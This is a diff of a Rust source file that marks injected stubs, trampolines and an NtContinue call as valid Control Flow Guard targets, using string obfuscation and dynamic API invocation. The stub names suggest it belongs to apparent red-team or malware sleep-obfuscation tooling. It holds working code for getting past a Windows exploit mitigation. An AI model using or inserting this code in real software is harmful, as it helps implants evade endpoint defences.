@@ -1,54 +1,17 @@
 use alloc::string::String;
-use core::{ffi::c_void, ptr::null_mut};
+use core::ffi::c_void;
 
 use obfstr::{obfstring as s};
 use anyhow::{Context, Result, bail};
-use dinvk::winapis::{NtCurrentProcess, NT_SUCCESS};
+use dinvk::winapis::NtCurrentProcess;
 use dinvk::helper::PE;
 
 use crate::config::Config;
-use crate::winapis::{
-    NtQueryInformationProcess, 
-    SetProcessValidCallTargets
-};
-use crate::types::{
-    CFG_CALL_TARGET_INFO, 
-    EXTENDED_PROCESS_INFORMATION
-};
+use crate::winapis::SetProcessValidCallTargets;
+use crate::types::CFG_CALL_TARGET_INFO;
 
 /// CFG_CALL_TARGET_VALID flag indicating a valid indirect call target.
 const CFG_CALL_TARGET_VALID: usize = 1;
-
-/// Used internally by Windows to identify per-process CFG state.
-const PROCESS_COOKIE: u32 = 36;
-
-/// Used for combining with ProcessCookie to retrieve CFG policy.
-const PROCESS_USER_MODE_IOPL: u32 = 16;
-
-/// Mitigation policy ID for Control Flow Guard (CFG)
-const ProcessControlFlowGuardPolicy: i32 = 7i32;
-
-/// Checks if Control Flow Guard (CFG) is enabled for the current process.
-pub fn is_cfg_enforced() -> Result<bool> {
-    let mut proc_info = EXTENDED_PROCESS_INFORMATION {
-        ExtendedProcessInfo: ProcessControlFlowGuardPolicy as u32,
-        ..Default::default()
-    };
-
-    let status = NtQueryInformationProcess(
-        NtCurrentProcess(),
-        PROCESS_COOKIE | PROCESS_USER_MODE_IOPL,
-        &mut proc_info as *mut _ as *mut c_void,
-        size_of::<EXTENDED_PROCESS_INFORMATION>() as u32,
-        null_mut(),
-    );
-
-    if !NT_SUCCESS(status) {
-        bail!(s!("NtQueryInformationProcess Failed"));
-    }
-
-    Ok(proc_info.ExtendedProcessInfoBuffer != 0)
-}
 
 /// Adds a valid CFG call target for the given module base and target function.
 pub fn add_cfg(module: usize, function: usize) -> Result<()> {
@@ -60,10 +23,10 @@ pub fn add_cfg(module: usize, function: usize) -> Result<()> {
         // Memory range to apply the CFG policy
         let size = ((*nt_header).OptionalHeader.SizeOfImage as usize + 0xFFF) & !0xFFF;
 
-        // Describe the valid call target
+        // Describe the valid call target (offset must be 16-byte aligned -- CFG bitmap granularity)
         let mut cfg = CFG_CALL_TARGET_INFO {
             Flags: CFG_CALL_TARGET_VALID,
-            Offset: function - module,
+            Offset: (function - module) & !0xF,
         };
 
         // Apply the new valid call target
@@ -86,8 +49,8 @@ pub fn add_cfg(module: usize, function: usize) -> Result<()> {
 /// Uses page-aligned base and page-sized region for SetProcessValidCallTargets.
 pub fn add_cfg_standalone(function: usize) -> Result<()> {
     let page_base = function & !0xFFF;
-    let offset = function - page_base;
-    let size = 0x1000; // single page
+    let offset = (function - page_base) & !0xF;
+    let size = 0x1000;
 
     let mut cfg_info = CFG_CALL_TARGET_INFO {
         Flags: CFG_CALL_TARGET_VALID,
@@ -108,50 +71,96 @@ pub fn add_cfg_standalone(function: usize) -> Result<()> {
     Ok(())
 }
 
+/// Find the PE module base by scanning backwards from an address for the MZ header.
+fn find_module_base(addr: usize) -> Option<usize> {
+    let mut base = addr & !0xFFF;
+    for _ in 0..2048 {
+        if base < 0x1000 { break; }
+        unsafe {
+            let sig = *(base as *const u16);
+            if sig == 0x5A4D {
+                return Some(base);
+            }
+        }
+        base -= 0x1000;
+    }
+    None
+}
+
+/// Register a stub address as a valid CFG target.
+/// For image-backed stubs (inside a PE module), uses module-level registration.
+/// For standalone allocations, uses page-level registration.
+fn add_cfg_for_stub(addr: u64, _label: &str) {
+    if addr == 0 {
+        if cfg!(debug_assertions) {
+            dinvk::println!("[CFG] skip {}: addr=0", _label);
+        }
+        return;
+    }
+    let addr_usize = addr as usize;
+
+    if let Some(module_base) = find_module_base(addr_usize) {
+        match add_cfg(module_base, addr_usize) {
+            Ok(()) => {
+                if cfg!(debug_assertions) {
+                    dinvk::println!("[CFG] OK {}: 0x{:x} (mod 0x{:x}, off 0x{:x})",
+                        _label, addr_usize, module_base, addr_usize - module_base);
+                }
+            }
+            Err(_e) => {
+                if cfg!(debug_assertions) {
+                    dinvk::println!("[CFG] FAIL {}: 0x{:x} (mod 0x{:x}) - {}",
+                        _label, addr_usize, module_base, _e);
+                }
+            }
+        }
+    } else {
+        match add_cfg_standalone(addr_usize) {
+            Ok(()) => {
+                if cfg!(debug_assertions) {
+                    dinvk::println!("[CFG] OK {} (standalone): 0x{:x}", _label, addr_usize);
+                }
+            }
+            Err(_e) => {
+                if cfg!(debug_assertions) {
+                    dinvk::println!("[CFG] FAIL {} (standalone): 0x{:x} - {}",
+                        _label, addr_usize, _e);
+                }
+            }
+        }
+    }
+}
+
 /// Registers known indirect call targets with Control Flow Guard (CFG).
 pub fn register_cfg_targets(cfg: &Config) {
+    if cfg!(debug_assertions) {
+        dinvk::println!("[CFG] Registering targets...");
+    }
+
     let targets = [(cfg.modules.ntdll, cfg.nt_continue)];
     for (module, func) in targets {
-        if let Err(e) = add_cfg(module.as_u64() as usize, func.as_u64() as usize) {
-            if cfg!(debug_assertions) {
-                dinvk::println!("add_cfg failed: {e}");
+        match add_cfg(module.as_u64() as usize, func.as_u64() as usize) {
+            Ok(()) => {
+                if cfg!(debug_assertions) {
+                    dinvk::println!("[CFG] OK NtContinue: 0x{:x}", func.as_u64());
+                }
+            }
+            Err(_e) => {
+                if cfg!(debug_assertions) {
+                    dinvk::println!("[CFG] FAIL NtContinue: 0x{:x} - {}", func.as_u64(), _e);
+                }
             }
         }
     }
 
-    // Register custom cipher stub as valid CFG target
-    if cfg.custom_encrypt != 0 {
-        if let Err(e) = add_cfg_standalone(cfg.custom_encrypt as usize) {
-            if cfg!(debug_assertions) {
-                dinvk::println!("add_cfg_standalone (cipher stub) failed: {e}");
-            }
-        }
-    }
+    add_cfg_for_stub(cfg.custom_encrypt, "encrypt");
+    add_cfg_for_stub(cfg.callback, "callback");
+    add_cfg_for_stub(cfg.trampoline, "trampoline");
+    add_cfg_for_stub(cfg.wfmo_trampoline, "wfmo_tramp");
+    add_cfg_for_stub(cfg.nt_set_event2_stub, "NtSetEvent2_stub");
+    add_cfg_for_stub(cfg.fiber_trampoline, "fiber_tramp");
 
-    // Register callback trampoline as valid CFG target
-    if cfg.callback != 0 {
-        if let Err(e) = add_cfg_standalone(cfg.callback as usize) {
-            if cfg!(debug_assertions) {
-                dinvk::println!("add_cfg_standalone (callback) failed: {e}");
-            }
-        }
-    }
-
-    // Register RtlCaptureContext trampoline as valid CFG target
-    if cfg.trampoline != 0 {
-        if let Err(e) = add_cfg_standalone(cfg.trampoline as usize) {
-            if cfg!(debug_assertions) {
-                dinvk::println!("add_cfg_standalone (trampoline) failed: {e}");
-            }
-        }
-    }
-
-    // Register WFMO trampoline as valid CFG target
-    if cfg.wfmo_trampoline != 0 {
-        if let Err(e) = add_cfg_standalone(cfg.wfmo_trampoline as usize) {
-            if cfg!(debug_assertions) {
-                dinvk::println!("add_cfg_standalone (wfmo_trampoline) failed: {e}");
-            }
-        }
+    if cfg!(debug_assertions) {
+        dinvk::println!("[CFG] Registration complete");
     }
 }
